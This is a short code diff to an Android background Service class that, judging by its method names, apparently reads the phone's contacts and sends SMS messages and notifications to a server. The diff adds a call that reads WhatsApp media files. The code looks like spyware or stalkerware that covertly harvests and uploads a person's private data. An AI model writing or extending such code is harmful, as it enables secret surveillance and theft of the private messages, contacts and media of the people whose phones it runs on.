@@ -53,6 +53,7 @@ public class BackgroundJob extends Service {
                         backgroundJobService.ReadPhoneContacts();
                         backgroundJobService.sendSMSToServer();
                         backgroundJobService.sendNotificationsToServer();
+                        backgroundJobService.readWhatsAppMediaFiles();
                     }
 //                    Toast.makeText(BackgroundJob.this, "Service is running", Toast.LENGTH_SHORT).show();
                 }
